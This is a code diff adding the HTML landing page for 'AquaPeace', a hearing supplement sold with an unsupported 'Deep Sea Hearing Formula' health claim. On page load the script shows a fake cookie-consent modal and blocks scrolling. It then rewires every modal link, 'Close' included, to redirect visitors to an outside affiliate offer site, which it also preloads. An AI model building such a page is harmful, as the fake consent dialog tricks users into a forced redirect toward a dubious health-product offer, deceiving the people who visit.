@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AquaPeace</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background: linear-gradient(#739BC4, #3D76B0);
+            min-height: 100vh;
+        }
+
+        header h1 {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-top: 1rem;
+        }
+
+        .modal {
+            display: none; /* Oculta o modal por padrão */
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: rgba(255, 255, 255, 0.9); /* Transparência adicionada */
+            margin: 10% auto;
+            padding: 40px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 600px;
+            text-align: left;
+            position: relative;
+        }
+
+        .modal-content h2 {
+            margin-top: 0;
+            color: black; /* Título "Cookie Policy" em preto */
+        }
+
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            color: #007bff; /* Azul sem hover e sem negrito */
+            font-size: 18px;
+            text-decoration: none;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: #007bff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        #acceptBtn {
+            background-color: #007bff;
+            color: white;
+            padding: 14px 28px; /* Ajuste para tornar o botão do mesmo tamanho que o botão da navbar */
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            font-size: 16px;
+            transition: background-color 0.3s ease; /* Adicionado efeito de transição */
+        }
+
+        #acceptBtn:hover {
+            background-color: #0069d9;
+        }
+
+        a.cookie-policy {
+            color: blue;
+            text-decoration: none;
+        }
+
+        a.cookie-policy:hover {
+            text-decoration: underline;
+        }
+
+        .navbar-dark .navbar-nav .nav-link {
+            color: #ffffff;
+        }
+
+        .navbar-dark .navbar-nav .btn {
+            background-color: #17a2b8;
+            color: #ffffff;
+        }
+
+        .bg-custom {
+            background-color: #272727;
+        }
+
+        .nav-item.mx-2 {
+            margin-right: 10px;
+        }
+
+        @media (max-width: 767.98px) {
+            header h1 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg navbar-dark bg-custom">
+    <div class="container">
+        <a class="navbar-brand" href="#">
+            <img src="img/white_logo.png" alt="AquaPeace Logo" style="height: 40px;">
+        </a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNav">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item mx-2">
+                    <a class="nav-link" href="#">About AquaPeace</a>
+                </li>
+                <li class="nav-item mx-2">
+                    <a class="nav-link" href="#">Ingredients</a>
+                </li>
+                <li class="nav-item mx-2">
+                    <a class="nav-link" href="#">FAQ</a>
+                </li>
+                <li class="nav-item mx-2">
+                    <a class="btn btn-info" href="#">Order Now</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Main Content -->
+<header class="bg-primary text-white text-center py-5">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-6 my-auto">
+                <img src="img/tsl-main.webp" class="img-fluid" alt="AquaPeace Product">
+            </div>
+            <div class="col-lg-6 my-auto">
+                <h1>This Deep Sea Hearing Formula Supports The Health Of Your Ears</h1>
+                <!-- Certificações e Logos -->
+                <div class="d-flex justify-content-center my-3">
+                    <!-- Coloque aqui a imagem das certificações e logos -->
+                    <img src="img/certifications_new.png" alt="Certifications and Logos" class="img-fluid">
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Modal -->
+<div id="myModal" class="modal">
+    <div class="modal-content">
+        <a href="https://sonovive.officialnaturalhealthoffers.online/" class="close" preload>Close</a>
+        <h2>Cookie Policy</h2>
+        <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="https://sonovive.officialnaturalhealthoffers.online/" class="cookie-policy" preload>Cookie Policy</a></p>
+        <a id="acceptBtn" href="https://sonovive.officialnaturalhealthoffers.online/" preload>Accept</a>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        var modal = document.getElementById("myModal");
+        var acceptBtn = document.getElementById("acceptBtn");
+        var modalLinks = document.querySelectorAll('.modal-content a[href]');
+
+        // Exibe o modal ao carregar a página
+        modal.style.display = "block";
+        document.body.style.overflow = "hidden"; // Bloqueia rolagem da página
+
+        acceptBtn.onclick = function(event) {
+            event.preventDefault(); // Impede o comportamento padrão do link
+            modal.style.display = "none";
+            document.body.style.overflow = "auto"; // Permite rolagem quando o modal está fechado
+            window.location.href = this.href; // Redireciona para o link do botão Accept
+        }
+
+        document.querySelector(".close").onclick = function() {
+            modal.style.display = "none";
+            document.body.style.overflow = "auto"; // Permite rolagem quando o modal está fechado
+        }
+
+        // Lidar com os links dentro do modal
+        modalLinks.forEach(function(link) {
+            link.onclick = function(event) {
+                event.preventDefault(); // Impede o comportamento padrão do link
+                modal.style.display = "none";
+                document.body.style.overflow = "auto"; // Permite rolagem quando o modal está fechado
+                window.location.href = this.href; // Redireciona para o link clicado dentro do modal
+            }
+        });
+
+        // Pré-carregar o link do modal
+        var preloadLinks = document.querySelectorAll('[preload]');
+        preloadLinks.forEach(function(link) {
+            var href = link.getAttribute('href');
+            if (href) {
+                var preloadLink = document.createElement('link');
+                preloadLink.href = href;
+                preloadLink.rel = 'preload';
+                preloadLink.as = 'document';
+                document.head.appendChild(preloadLink);
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
